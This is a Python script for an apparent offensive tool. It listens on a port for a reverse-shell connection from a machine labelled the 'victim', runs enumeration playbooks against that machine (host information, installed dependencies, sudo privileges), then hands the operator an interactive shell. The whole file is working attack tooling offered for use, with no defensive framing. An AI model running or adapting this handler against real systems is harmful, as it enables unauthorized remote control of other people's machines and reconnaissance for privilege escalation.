import argparse
from typing import List
import pwn
import pheelprompt
import pheelshell
import playbooks.enumerate.basic_host_information
import playbooks.enumerate.dependencies
import playbooks.enumerate.sudo_list
import pwnlib_socket_wrapper
import utilities

EXPECTED_PROMPT = b'$ '

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-v', '--victim_ip', required=True)
    parser.add_argument('-p', '--port', default=9001)
    args = parser.parse_args()

    ipv4s = utilities.fetch_ipv4_addresses()
    attacker_ip = pick_best_nic(ipv4s, args.victim_ip)

    active_playbooks = [
        playbooks.enumerate.dependencies.EnumerateDependencies(),
        playbooks.enumerate.basic_host_information.EnumerateBasicHostInformation(),
        playbooks.enumerate.sudo_list.EnumerateSudoList()
    ]

    print(f'[listener] Listening {attacker_ip}:{args.port}...', end=' ')
    pwn.context.log_level = 'error'
    with pwn.listen(args.port).wait_for_connection() as client:
        print('Connected!')
        socket_wrapper = pwnlib_socket_wrapper.PwnlibSocketWrapper(client, EXPECTED_PROMPT, attacker_ip)
        shell = pheelshell.Pheelshell(socket_wrapper)

        for playbook in active_playbooks:
            shell.run_playbook(playbook)

        for playbook in active_playbooks:
            print(str(playbook))

        pheelprompt.prompt(shell)

def pick_best_nic(ipv4s: List[str], target_ip: str) -> str:
    best_match = 0
    best_match_nic = None
    for ipv4 in ipv4s:
        matching_count = count_matching_starting_characters(ipv4, target_ip)
        if matching_count > best_match:
            best_match = matching_count
            best_match_nic = ipv4

    return best_match_nic

def count_matching_starting_characters(substring: str, string: str) -> int:
    count = 0
    for subchar, char in zip(substring, string):
        if subchar == char:
            count += 1
        else:
            break
    
    return count

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print('\b\b\r')
